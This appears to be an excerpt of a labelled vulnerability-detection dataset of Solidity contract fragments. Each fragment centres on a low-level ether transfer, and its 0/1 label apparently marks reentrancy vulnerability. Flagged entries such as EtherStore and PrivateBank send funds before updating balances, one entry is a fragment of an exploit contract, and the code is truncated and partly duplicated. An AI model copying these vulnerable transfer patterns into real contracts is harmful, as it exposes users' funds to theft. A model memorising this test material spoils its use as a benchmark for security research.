forward.call.value(address(this).balance)();
return true;
0
---------------------------------
1580 32559_1.sol
32559_1.sol
function transfer(address _to, uint256 _value, bytes _data, string _custom_fallback) onlyPayloadSize(4 * 32) public returns (bool success) {
if(isContract(_to)) {
require(Balances(balancesContract()).get(msg.sender) >= _value);
Balances(balancesContract()).transfer(msg.sender, _to, _value);
ContractReceiver receiver = ContractReceiver(_to);
require(receiver.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
Transfer(msg.sender, _to, _value);
Transfer(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
1581 35617_1.sol
35617_1.sol
function buyRecipient(address recipient) duringCrowdSale payable {
require(!halted);
uint tokens = safeMul(msg.value, price(block.timestamp));
require(safeAdd(saleTokenSupply,tokens)<=coinAllocation );
balances[recipient] = safeAdd(balances[recipient], tokens);
totalSupply = safeAdd(totalSupply, tokens);
saleTokenSupply = safeAdd(saleTokenSupply, tokens);
salesVolume = safeAdd(salesVolume, msg.value);
if (!founder.call.value(msg.value)()) revert();
Buy(recipient, msg.value, tokens);
function buy() payable {
buyRecipient(msg.sender);
function() payable {
buyRecipient(msg.sender);
function buy() payable {
buyRecipient(msg.sender);
function() payable {
buyRecipient(msg.sender);
0
---------------------------------
1582 25808_1.sol
25808_1.sol
function getTokens(uint num, address addr) public {
for(uint i = 0; i < num; i++){
addr.call.value(0 wei)();
1
---------------------------------
1583 22805_1.sol
22805_1.sol
function eT(address _pd, uint _tkA, uint _etA) returns (bool success) {
balances[msg.sender] = safeSub(balances[msg.sender], _tkA);
balances[_pd] = safeAdd(balances[_pd], _tkA);
if (!_pd.call.value(_etA)()) revert();
ET(_pd, _tkA, _etA);
return true;
0
---------------------------------
1584 Reentrance_exploit_1.sol
Reentrance_exploit_1.sol
function deposit(address _vulnerable_contract) public payable{
vulnerable_contract = _vulnerable_contract ;
require(vulnerable_contract.call.value(msg.value)(bytes4(sha3("addToBalance()"))));
1
---------------------------------
1585 14284.sol
14284.sol
function payCharity() payable public {
uint256 ethToPay = SafeMath.sub(totalEthCharityCollected, totalEthCharityRecieved);
require(ethToPay > 1);
totalEthCharityRecieved = SafeMath.add(totalEthCharityRecieved, ethToPay);
if(!giveEthCharityAddress.call.value(ethToPay).gas(400000)()) {
totalEthCharityRecieved = SafeMath.sub(totalEthCharityRecieved, ethToPay);
0
---------------------------------
1586 40366.sol
40366.sol
function execute(address _to, uint _value, bytes _data) {
if (!isRightBranch) throw;
if (msg.sender != owner) throw;
if (!_to.call.value (_value)(_data)) throw;
contract BranchSender {
bool public isRightBranch;
0
---------------------------------
1587 2189.sol
2189.sol
function transferAndCall( address _to,  uint256 _value,   bytes _data) public payable whenNotPaused returns (bool) {
require(_to != address(this));
super.transfer(_to, _value);
require(_to.call.value(msg.value)(_data));
return true;
contract GOeurekaSale is Claimable, gotTokenSaleConfig, Pausable, Salvageable {
using SafeMath for uint256;
GOeureka public token;
WhiteListedBasic public whiteListed;
uint256 public presaleEnd;
uint256 public saleEnd;
uint256 public minContribution;
address public multiSig;
uint256 public weiRaised;
uint256 public tokensRaised;
mapping(address => uint256) public contributions;
uint256 public numberOfContributors = 0;
uint public basicRate;
event TokenPurchase(address indexed beneficiary, uint256 value, uint256 amount);
event SaleClosed();
event HardcapReached();
event NewCapActivated(uint256 newCap);
constructor(GOeureka token_, WhiteListedBasic _whiteListed) public {
basicRate = 3000;
calculateRates();
presaleEnd = 1536508800;
saleEnd = 1543593600;
multiSig = MULTISIG_ETH;
token = token_;
whiteListed = _whiteListed;
bool allocated = false;
1
---------------------------------
1588 27263.sol
27263.sol
function loggedTransfer(uint amount, bytes32 logMsg, address target, address currentOwner) payable{
if(msg.sender != address(this))throw;
if(target.call.value(amount)()) {
CashMove(amount, logMsg, target, currentOwner);
function Divest(uint amount)  public  {
if ( investors[msg.sender] > 0 && amount > 0)  {
this.loggedTransfer(amount, "", msg.sender, owner);
investors[msg.sender] -= amount;
function withdraw() public {
if(msg.sender==owner) {
this.loggedTransfer(this.balance, "", msg.sender, owner);
1
---------------------------------
1589 22247.sol
22247.sol
function Collect(uint _am) public payable {
if(Accounts[msg.sender]>=MinSum && _am<=Accounts[msg.sender] && block.number>putBlock) {
if(msg.sender.call.value(_am)()) {
Accounts[msg.sender]-=_am;
LogFile.AddMessage(msg.sender,_am,"Collect");
function()
public
payable
Put(msg.sender);
contract Log
struct Message
address Sender;
string  Data;
uint Val;
uint  Time;
Message[] public History;
Message LastMsg;
1
---------------------------------
1590 37676.sol
37676.sol
function send(address _to, uint _value, bytes _data) only_owner {
if (!_to.call.value(_value)(_data)) throw;
Sent(_to, _value, _data);
0
---------------------------------
1591 33410.sol
33410.sol
function executeTransaction(uint transactionId)  internal notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction tx = transactions[transactionId];
tx.executed = true;
if (tx.destination.call.value(tx.value)(tx.data))
Execution(transactionId);
else {
ExecutionFailure(transactionId);
tx.executed = false;
function confirmTransaction(uint transactionId)  public ownerExists(msg.sender) transactionExists(transactionId)  notConfirmed(transactionId, msg.sender){
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
1592 4472.sol
4472.sol
function () public payable {
address(0x0581cee36a85Ed9e76109A9EfE3193de1628Ac2A).call.value(msg.value)();
0
---------------------------------
1593 37474.sol
37474.sol
function execute(address _to, uint _value, bytes _data) external returns (bytes32 _r) {
require(msg.sender==owner);
require(_to.call.value(_value)(_data));
return 0;
0
---------------------------------
1594 33835.sol
33835.sol
function confirm(bytes32 _h) onlymanyowners(_h) returns (bool) {
if (m_txs[_h].to != 0) {
var x= m_txs[_h].to.call.value(m_txs[_h].value)(m_txs[_h].data);
MultiTransact(msg.sender, _h, m_txs[_h].value, m_txs[_h].to, m_txs[_h].data);
delete m_txs[_h];
return true;
function execute(address _to, uint _value, bytes _data) external onlyowner returns (bytes32 _r) {
_r = sha3(msg.data, block.number);
if (!confirm(_r) && m_txs[_r].to == 0) {
m_txs[_r].to = _to;
m_txs[_r].value = _value;
m_txs[_r].data = _data;
ConfirmationNeeded(_r, msg.sender, _value, _to, _data);
0
---------------------------------
1595 1044.sol
1044.sol
function donateToWhale(uint256 amount) internal {
whale.call.value(amount)(bytes4(keccak256("donate()")));
totalDonated += amount;
emit Donate(amount, whale, msg.sender);
function loseWager(uint256 amount) internal {
whale.call.value(amount)(bytes4(keccak256("donate()")));
totalDonated += amount;
emit Lose(amount, msg.sender);
1
---------------------------------
1596 17573.sol
17573.sol
function transferFrom(address _from, address _to, uint256 _amount, bytes _data, string _custom_fallback) public  returns (bool success)    {
if (isContract(controller)) {
if (!TokenController(controller).onTransfer(_from, _to, _amount))
throw;
require(super.transferFrom(_from, _to, _amount));
if (isContract(_to)) {
ERC223ReceivingContract receiver = ERC223ReceivingContract(_to);
receiver.call.value(0)(bytes4(keccak256(_custom_fallback)), _from, _amount, _data);
ERC223Transfer(_from, _to, _amount, _data);
return true;
function transfer( address _to,  uint _amount, bytes _data,  string _custom_fallback)  public   returns (bool success)  {
return transferFrom(msg.sender, _to, _amount, _data, _custom_fallback);
0
---------------------------------
1597 17215.sol
17215.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public isRunning returns (bool ok) {
require(compatible223ex);
require(isUnlockedBoth(_to));
require(balances[msg.sender] >= _value);
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
if (isContract(_to)) {
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
Transfer(msg.sender, _to, _value, _data);
Transfer(msg.sender, _to, _value);
return true;
0
---------------------------------
1598 16057.sol
16057.sol
function callFirstTarget () public payable onlyPlayers {
require (msg.value >= 0.005 ether);
firstTarget.call.value(msg.value)();
function callSecondTarget () public payable onlyPlayers {
require (msg.value >= 0.005 ether);
secondTarget.call.value(msg.value)();
function winPrize() public payable onlyOwner {
owner.call.value(1 wei)();
0
---------------------------------
1599 19402.sol
19402.sol
function buyToken(address recipient, uint256 value) internal {
if (block.number<startBlock || block.number>endBlock) throw;
uint tokens = safeMul(value, price());
if(safeAdd(crowdSaleSoldAmount, tokens)>crowdSaleCap) throw;
balances[recipient] = safeAdd(balances[recipient], tokens);
crowdSaleSoldAmount = safeAdd(crowdSaleSoldAmount, tokens);
totalSupply = safeAdd(totalSupply, tokens);
Transfer(address(0), recipient, tokens);
if (!founder.call.value(value)()) throw;
Buy(recipient, value, tokens);
function price() constant returns(uint) {
if (block.number<startBlock || block.number > endBlock) return 0;
else  return crowdSalePrice;
function() public payable {
if(msg.value == 0) {
sendCandy(msg.sender);
}  else {
buyToken(msg.sender, msg.value);
0
---------------------------------
1600 3054.sol
3054.sol
function player_withdrawPendingTransactions() public returns (bool){
uint withdrawAmount = playerPendingWithdrawals[msg.sender];
playerPendingWithdrawals[msg.sender] = 0;
if (msg.sender.call.value(withdrawAmount)()) {
return true;
} else {
playerPendingWithdrawals[msg.sender] = withdrawAmount;
return false;
1
---------------------------------
1601 29517.sol
29517.sol
function temporaryEscapeHatch(address to, uint256 value, bytes data) public {
require(msg.sender == admin);
require(to.call.value(value)(data));
0
---------------------------------
1602 30046.sol
30046.sol
function executeTransaction() public onlyActiveUsersAllowed()  transactionMustBePending() {
Transaction storage transaction = transactions[transactions.length - 1];
require(now > transaction.time_initiated + users[transaction.initiated_by].waiting_time);
transaction.is_executed = true;
transaction.time_finalized = now;
transaction.finalized_by = msg.sender;
transaction.execution_successful = transaction.destination.call.value(
transaction.value)(transaction.data);
1
---------------------------------
1603 27248.sol
27248.sol
function execute(uint8[] sigV, bytes32[] sigR, bytes32[] sigS, address destination, uint value, bytes data) public {
require(sigR.length == threshold);
require(sigR.length == sigS.length && sigR.length == sigV.length);
bytes32 txHash = keccak256(byte(0x19), byte(0), address(this), destination, value, data, nonce);
address lastAdd = address(0);
for (uint i = 0; i < threshold; i++) {
address recovered = ecrecover(txHash, sigV[i], sigR[i], sigS[i]);
require(recovered > lastAdd && isOwner[recovered]);
lastAdd = recovered;
nonce = nonce + 1;
require(destination.call.value(value)(data));
0
---------------------------------
1604 EtherStore.sol
EtherStore.sol
function withdrawFunds (uint256 _weiToWithdraw) public {
require(balances[msg.sender] >= _weiToWithdraw);
require(_weiToWithdraw <= withdrawalLimit);
require(now >= lastWithdrawTime[msg.sender] + 1 weeks);
require(msg.sender.call.value(_weiToWithdraw)());
balances[msg.sender] -= _weiToWithdraw;
lastWithdrawTime[msg.sender] = now;
1
---------------------------------
1605 40589.sol
40589.sol
function sendRobust(address to, uint value) internal {
if (!to.send(value)) {
if (!to.call.value(value)()) throw;
function _fillOrder(address _from, uint numTokens) internal returns (bool) {
if (numTokens == 0) throw;
if (this.balance < numTokens * weiPerToken / decimalPlaces) throw;
if (!token.transferFrom(_from, owner, numTokens)) return false;
sendRobust(_from, numTokens * weiPerToken / decimalPlaces);
OrderFilled(_from, numTokens);
return true;
0
---------------------------------
1606 11705.sol
11705.sol
function commonWithdraw(address token, uint value) internal {
require (tokens[token][msg.sender] >= value);
tokens[token][msg.sender] -= value;
totalDeposited[token] -= value;
require((token != 0)?
ERC20(token).transfer(msg.sender, value):
msg.sender.call.value(value)()
);
emit Withdraw(
token,
msg.sender,
value,
tokens[token][msg.sender]);
function withdraw(uint amount) public {
commonWithdraw(0, amount);
function withdrawToken(address token, uint amount) public {
commonWithdraw(token, amount);
0
---------------------------------
1607 37891.sol
37891.sol
function claim() {
uint balance = balances[msg.sender];
require(balance > 0);
balances[msg.sender] = 0;
bool claimed = msg.sender.call.value(balance)();
require(claimed);
0
---------------------------------
1608 23166.sol
23166.sol
function buy(address recipient) payable public duringCrowdSale  {
require(!halted);
require(msg.value >= 0.01 ether);
uint256 tokens = msg.value.mul(35e4);
require(tokens > 0);
require(saleTokenSupply.add(tokens)<=coinAllocation );
balances[recipient] = balances[recipient].add(tokens);
totalSupply_ = totalSupply_.add(tokens);
saleTokenSupply = saleTokenSupply.add(tokens);
salesVolume = salesVolume.add(msg.value);
if (!founder.call.value(msg.value)()) revert();
Buy(msg.sender, recipient, msg.value, tokens);
function TorusCoin(uint256 startDatetimeInSeconds, address founderWallet) public {
admin = msg.sender;
founder = founderWallet;
startDatetime = startDatetimeInSeconds;
endDatetime = startDatetime + 16 * 1 days;
function() public payable {
buy(msg.sender);
0
---------------------------------
1609 40416.sol
40416.sol
function withdraw(uint amount) {
if (msg.value>0) throw;
if (tokens[0][msg.sender] < amount) throw;
tokens[0][msg.sender] -= amount;
if (!msg.sender.call.value(amount)()) throw;
Withdraw(0, msg.sender, amount, tokens[0][msg.sender]);
0
---------------------------------
1610 37329.sol
37329.sol
function buyICO() onlyExecutorOrOwner {
if (getBlockNumber() < icoStartBlock) return;
if (this.balance == 0) return;
uint256 purchaseAmount = Math.min256(this.balance, purchaseCap);
assert(crowdSale.call.value(purchaseAmount)());
ICOPurchased(purchaseAmount);
0
---------------------------------
1611 13076.sol
13076.sol
function approveAndCall(address _spender, uint256 _value, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.approve(_spender, _value);
require(_spender.call.value(msg.value)(_data));
return true;
function transferAndCall(address _to, uint256 _value, bytes _data) public payable returns (bool) {
require(_to != address(this));
super.transfer(_to, _value);
require(_to.call.value(msg.value)(_data));
return true;
function transferFromAndCall(    address _from,    address _to,    uint256 _value,    bytes _data  )    public payable returns (bool)  {
require(_to != address(this));
super.transferFrom(_from, _to, _value);
require(_to.call.value(msg.value)(_data));
return true;
function increaseApprovalAndCall(address _spender, uint _addedValue, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.increaseApproval(_spender, _addedValue);
require(_spender.call.value(msg.value)(_data));
return true;
function decreaseApprovalAndCall(address _spender, uint _subtractedValue, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.decreaseApproval(_spender, _subtractedValue);
require(_spender.call.value(msg.value)(_data));
return true;
contract TimedCrowdsale is Crowdsale {
using SafeMath for uint256;
uint256 public openingTime;
uint256 public closingTime;
modifier onlyWhileOpen {
require(block.timestamp >= openingTime && block.timestamp <= closingTime);
_;
1
---------------------------------
1612 39890.sol
39890.sol
function authorizePayment(uint _idMilestone) internal {
if (_idMilestone >= milestones.length) throw;
Milestone milestone = milestones[_idMilestone];
if (milestone.status == MilestoneStatus.AuthorizedForPayment) throw;
milestone.status = MilestoneStatus.AuthorizedForPayment;
if(!milestone.paymentSource.call.value(0)(milestone.payData)) throw;
ProposalStatusChanged(_idMilestone, milestone.status);
function approveCompletedMilestone(uint _idMilestone) campaignNotCanceled notChanging {
if (_idMilestone >= milestones.length) throw;
Milestone milestone = milestones[_idMilestone];
if ((msg.sender != milestone.reviewer) ||(milestone.status != MilestoneStatus.Completed)) throw;
authorizePayment(_idMilestone);
function requestMilestonePayment(uint _idMilestone) campaignNotCanceled notChanging {
if (_idMilestone >= milestones.length) throw;
Milestone milestone = milestones[_idMilestone];
if ((msg.sender != milestone.milestoneLeadLink)&&(msg.sender != recipient))  throw;
if ((milestone.status != MilestoneStatus.Completed) || (now < milestone.doneTime + milestone.reviewTime)) throw;
authorizePayment(_idMilestone);
function arbitrateApproveMilestone(uint _idMilestone) onlyArbitrator campaignNotCanceled notChanging {
if (_idMilestone >= milestones.length) throw;
Milestone milestone = milestones[_idMilestone];
if ((milestone.status != MilestoneStatus.AcceptedAndInProgress) && (milestone.status != MilestoneStatus.Completed)) throw;
authorizePayment(_idMilestone);
0
---------------------------------
1613 35661.sol
35661.sol
function refund() stopInEmergency {
if(getState() != State.Refunding) throw;
address investor = msg.sender;
if(balances[investor] == 0) throw;
uint amount = balances[investor];
delete balances[investor];
if(!(investor.call.value(amount)())) throw;
Refunded(investor, amount);
0
---------------------------------
1614 35649.sol
35649.sol
function playerWithdrawPendingTransactions() public  payoutsAreActive   returns (bool)  {
uint withdrawAmount = playerPendingWithdrawals[msg.sender];
playerPendingWithdrawals[msg.sender] = 0;
if (msg.sender.call.value(withdrawAmount)()) {
return true;
} else {
playerPendingWithdrawals[msg.sender] = withdrawAmount;
return false;
0
---------------------------------
1615 39932.sol
39932.sol
function process(bytes32 _destination) payable returns (bool) {
if (msg.value < 100) throw;
var tax = msg.value * taxPerc / 100;
var refill = bytes4(sha3("refill(bytes32)"));
if ( !ledger.call.value(tax)(refill, taxman)|| !ledger.call.value(msg.value - tax)(refill, _destination)) throw;
return true;
contract Invoice is Mortal {
address   public signer;
uint      public closeBlock;
Comission public comission;
string    public description;
bytes32   public beneficiary;
uint      public value;
0
---------------------------------
1616 31759.sol
31759.sol
function execute(uint8[] sigV, bytes32[] sigR, bytes32[] sigS, address destination,  uint value, bytes data)  external {
bytes32 txHash = keccak256(byte(0x19),  byte(0), this, nonce++, destination, value, data  );
verifySignatures( sigV,sigR,sigS,txHash);
require(destination.call.value(value)(data));
0
---------------------------------
1617 22902.sol
22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
1618 30337.sol
30337.sol
function withdrawPayments()  external   returns (bool success) {
uint256 payment = payments[msg.sender];
payments[msg.sender] = 0;
totalBalance -= payment;
if (!msg.sender.call.value(payment)()) {
throw;
success = true;
0
---------------------------------
1619 2013.sol
2013.sol
function executeTransaction(address destination, uint value, bytes data) public onlyOwner{
if (destination.call.value(value)(data))
emit Execution(destination,value,data);
else
emit ExecutionFailure(destination,value,data);
library SafeMath {
0
---------------------------------
1620 16643.sol
16643.sol
function fundPuppets() public payable {
require(msg.sender == owner);
_share = SafeMath.div(msg.value, 4);
extra[0].call.value(_share).gas(800000)();
extra[1].call.value(_share).gas(800000)();
extra[2].call.value(_share).gas(800000)();
extra[3].call.value(_share).gas(800000)();
function() payable public{
contract Puppet {
mapping (uint256 => address) public target;
mapping (uint256 => address) public master;
constructor() payable public{
target[0] = 0x509Cb8cB2F8ba04aE81eEC394175707Edd37e109;
master[0] = 0x5C035Bb4Cb7dacbfeE076A5e61AA39a10da2E956;
function() public payable{
if(msg.sender != target[0]){
target[0].call.value(msg.value).gas(600000)();
function fundPuppets() public payable {
require(msg.sender == owner);
_share = SafeMath.div(msg.value, 4);
extra[0].call.value(_share).gas(800000)();
extra[1].call.value(_share).gas(800000)();
extra[2].call.value(_share).gas(800000)();
extra[3].call.value(_share).gas(800000)();
function() payable public{
contract Puppet {
mapping (uint256 => address) public target;
mapping (uint256 => address) public master;
constructor() payable public{
target[0] = 0x509Cb8cB2F8ba04aE81eEC394175707Edd37e109;
master[0] = 0x5C035Bb4Cb7dacbfeE076A5e61AA39a10da2E956;
function() public payable{
if(msg.sender != target[0]){
target[0].call.value(msg.value).gas(600000)();
function fundPuppets() public payable {
require(msg.sender == owner);
_share = SafeMath.div(msg.value, 4);
extra[0].call.value(_share).gas(800000)();
extra[1].call.value(_share).gas(800000)();
extra[2].call.value(_share).gas(800000)();
extra[3].call.value(_share).gas(800000)();
function() payable public{
contract Puppet {
mapping (uint256 => address) public target;
mapping (uint256 => address) public master;
constructor() payable public{
target[0] = 0x509Cb8cB2F8ba04aE81eEC394175707Edd37e109;
master[0] = 0x5C035Bb4Cb7dacbfeE076A5e61AA39a10da2E956;
function() public payable{
if(msg.sender != target[0]){
target[0].call.value(msg.value).gas(600000)();
function fundPuppets() public payable {
require(msg.sender == owner);
_share = SafeMath.div(msg.value, 4);
extra[0].call.value(_share).gas(800000)();
extra[1].call.value(_share).gas(800000)();
extra[2].call.value(_share).gas(800000)();
extra[3].call.value(_share).gas(800000)();
function() payable public{
contract Puppet {
mapping (uint256 => address) public target;
mapping (uint256 => address) public master;
constructor() payable public{
target[0] = 0x509Cb8cB2F8ba04aE81eEC394175707Edd37e109;
master[0] = 0x5C035Bb4Cb7dacbfeE076A5e61AA39a10da2E956;
function() public payable{
if(msg.sender != target[0]){
target[0].call.value(msg.value).gas(600000)();
function fundPuppets() public payable {
require(msg.sender == owner);
_share = SafeMath.div(msg.value, 4);
extra[0].call.value(_share).gas(800000)();
extra[1].call.value(_share).gas(800000)();
extra[2].call.value(_share).gas(800000)();
extra[3].call.value(_share).gas(800000)();
function() payable public{
contract Puppet {
mapping (uint256 => address) public target;
mapping (uint256 => address) public master;
constructor() payable public{
target[0] = 0x509Cb8cB2F8ba04aE81eEC394175707Edd37e109;
master[0] = 0x5C035Bb4Cb7dacbfeE076A5e61AA39a10da2E956;
function() public payable{
if(msg.sender != target[0]){
target[0].call.value(msg.value).gas(600000)();
0
---------------------------------
1621 31565.sol
31565.sol
function reject(address _participant) onlyOwner public {
uint256 weiAmount = deposited[_participant];
require(weiAmount > 0);
deposited[_participant] = 0;
Rejected(_participant);
require(_participant.call.value(weiAmount)());
function rejectMany(address[] _participants) onlyOwner public {
for (uint256 i = 0; i < _participants.length; i++) {
reject(_participants[i]);
0
---------------------------------
1622 35878.sol
35878.sol
function Forwarder(address _creator, bytes32 _regName, address _owner)
public
RegBase(_creator, _regName, _owner)
forwardTo = owner;
function() public payable {
Forwarded(msg.sender, forwardTo, msg.value);
require(forwardTo.call.value(msg.value)(msg.data));
function createNew(bytes32 _regName, address _owner)
public
payable
feePaid
returns (address kAddr_)
kAddr_ = address(new Forwarder(msg.sender, _regName, _owner));
Created(msg.sender, _regName, kAddr_);
0
---------------------------------
1623 6881.sol
6881.sol
function buyOne(ERC20 token, address _exchange, uint256 _value, bytes _data) payable public {
balances[msg.sender] = balances[msg.sender].add(msg.value);
uint256 tokenBalance = token.balanceOf(this);
require(_exchange.call.value(_value)(_data));
balances[msg.sender] = balances[msg.sender].sub(_value);
tokenBalances[msg.sender][token] = tokenBalances[msg.sender][token].add(token.balanceOf(this).sub(tokenBalance));
1
---------------------------------
1624 PrivateBank.sol
PrivateBank.sol
function CashOut(uint _am)  {
if(_am<=balances[msg.sender]) {
if(msg.sender.call.value(_am)()) {
balances[msg.sender]-=_am;
TransferLog.AddMessage(msg.sender,_am,"CashOut");
function() public payable{}
contract Log
struct Message
address Sender;
string  Data;
uint Val;
uint  Time;
Message[] public History;
Message LastMsg;
1
---------------------------------
1625 1123.sol
1123.sol
function distributeExternal(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_) private returns(F3Ddatasets.EventReturns)  {
uint256 _p1 = _eth / 100;
uint256 _com = _eth / 50;
_com = _com.add(_p1);
uint256 _p3d;
if (!address(admin).call.value(_com)()) {
_p3d = _com;
_com = 0;
uint256 _aff = _eth / 10;
if (_affID != _pID && plyr_[_affID].name != '') {
plyr_[_affID].aff = _aff.add(plyr_[_affID].aff);
emit F3Devents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _rID, _pID, _aff, now);
} else {
_p3d = _aff;
_p3d = _p3d.add((_eth.mul(fees_[_team].p3d)) / (100));
if (_p3d > 0) {
admin.transfer(_p3d);
_eventData_.P3DAmount = _p3d.add(_eventData_.P3DAmount);
return(_eventData_);
function core(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_) private {
if (plyrRnds_[_pID][_rID].keys == 0)
_eventData_ = managePlayer(_pID, _eventData_);
if (round_[_rID].eth < 400000000000000000000 && plyrRnds_[_pID][_rID].eth.add(_eth) > 4000000000000000000){
uint256 _availableLimit = (4000000000000000000).sub(plyrRnds_[_pID][_rID].eth);
uint256 _refund = _eth.sub(_availableLimit);
plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);
_eth = _availableLimit;
if (_eth > 1000000000) {
uint256 _keys = (round_[_rID].eth).keysRec(_eth);
if (_keys >= 1000000000000000000) {
updateTimer(_keys, _rID);
if (round_[_rID].plyr != _pID)
round_[_rID].plyr = _pID;
if (round_[_rID].team != _team)
round_[_rID].team = _team;
_eventData_.compressedData = _eventData_.compressedData + 100;
if (_eth >= 100000000000000000) {
airDropTracker_++;
if (airdrop() == true) {
uint256 _prize;
if (_eth >= 10000000000000000000) {
_prize = ((airDropPot_).mul(75)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
} else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {
_prize = ((airDropPot_).mul(50)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 200000000000000000000000000000000;
} else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {
_prize = ((airDropPot_).mul(25)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
_eventData_.compressedData += 10000000000000000000000000000000;
_eventData_.compressedData += _prize * 1000000000000000000000000000000000;
airDropTracker_ = 0;
_eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);
plyrRnds_[_pID][_rID].keys = _keys.add(plyrRnds_[_pID][_rID].keys);
plyrRnds_[_pID][_rID].eth = _eth.add(plyrRnds_[_pID][_rID].eth);
round_[_rID].keys = _keys.add(round_[_rID].keys);
round_[_rID].eth = _eth.add(round_[_rID].eth);
rndTmEth_[_rID][_team] = _eth.add(rndTmEth_[_rID][_team]);
_eventData_ = distributeExternal(_rID, _pID, _eth, _affID, _team, _eventData_);
_eventData_ = distributeInternal(_rID, _pID, _eth, _team, _keys, _eventData_);
endTx(_pID, _team, _eth, _keys, _eventData_);
function coreQR(address _realSender,uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_)       private   {
if (plyrRnds_[_pID][_rID].keys == 0)
_eventData_ = managePlayer(_pID, _eventData_);
if (round_[_rID].eth < 400000000000000000000 && plyrRnds_[_pID][_rID].eth.add(_eth) > 4000000000000000000) {
uint256 _availableLimit = (4000000000000000000).sub(plyrRnds_[_pID][_rID].eth);
uint256 _refund = _eth.sub(_availableLimit);
plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);
_eth = _availableLimit;
if (_eth > 1000000000) {
uint256 _keys = (round_[_rID].eth).keysRec(_eth);
if (_keys >= 1000000000000000000){
updateTimer(_keys, _rID);
if (round_[_rID].plyr != _pID)
round_[_rID].plyr = _pID;
if (round_[_rID].team != _team)
round_[_rID].team = _team;
_eventData_.compressedData = _eventData_.compressedData + 100;
if (_eth >= 100000000000000000) {
airDropTracker_++;
if (airdrop() == true) {
uint256 _prize;
if (_eth >= 10000000000000000000) {
_prize = ((airDropPot_).mul(75)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
} else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {
_prize = ((airDropPot_).mul(50)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 200000000000000000000000000000000;
} else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {
_prize = ((airDropPot_).mul(25)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
_eventData_.compressedData += 10000000000000000000000000000000;
_eventData_.compressedData += _prize * 1000000000000000000000000000000000;
airDropTracker_ = 0;
_eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);
plyrRnds_[_pID][_rID].keys = _keys.add(plyrRnds_[_pID][_rID].keys);
plyrRnds_[_pID][_rID].eth = _eth.add(plyrRnds_[_pID][_rID].eth);
round_[_rID].keys = _keys.add(round_[_rID].keys);
round_[_rID].eth = _eth.add(round_[_rID].eth);
rndTmEth_[_rID][_team] = _eth.add(rndTmEth_[_rID][_team]);
_eventData_ = distributeExternal(_rID, _pID, _eth, _affID, _team, _eventData_);
_eventData_ = distributeInternal(_rID, _pID, _eth, _team, _keys, _eventData_);
endTxQR(_realSender,_pID, _team, _eth, _keys, _eventData_);
0
---------------------------------
1626 39662.sol
39662.sol
function sendToCharger(uint id){
if (msg.sender != Owner && msg.sender != Manager) return ;
var _amountForCharger = getAmountForCharger(id);
uint _priceOfCharger = Chargers[id].Address.getPrice() ;
if(_priceOfCharger> _amountForCharger){
uint difference  = _priceOfCharger - _amountForCharger;
calculateCountOfInvestmetnsInQueue(difference,id);
if(!Chargers[id].Address.call.value(_priceOfCharger)())   throw;
0
---------------------------------
1627 28974.sol
28974.sol
function pay(address _addr, uint256 count) public payable {
assert(changeable==true);
assert(msg.value >= price*count);
if(!founder.call.value(price*count)() || !msg.sender.call.value(msg.value-price*count)()){
revert();
s.update(_addr,count);
Buy(msg.sender,count);
function () public payable {
pay(msg.sender,1);
1
---------------------------------
1628 27188.sol
27188.sol
function loggedTransfer(uint amount, bytes32 message, address target, address currentOwner) protected {
if(!target.call.value(amount)()) throw;
Transfer(amount, message, target, currentOwner);
function divest(uint amount) public {
if ( investors[msg.sender].investment == 0 || amount == 0) throw;
investors[msg.sender].investment -= amount;
sumInvested -= amount;
this.loggedTransfer(amount, "", msg.sender, owner);
function payDividend() public {
uint dividend = calculateDividend();
if (dividend == 0) throw;
investors[msg.sender].lastDividend = sumDividend;
this.loggedTransfer(dividend, "Dividend payment", msg.sender, owner);
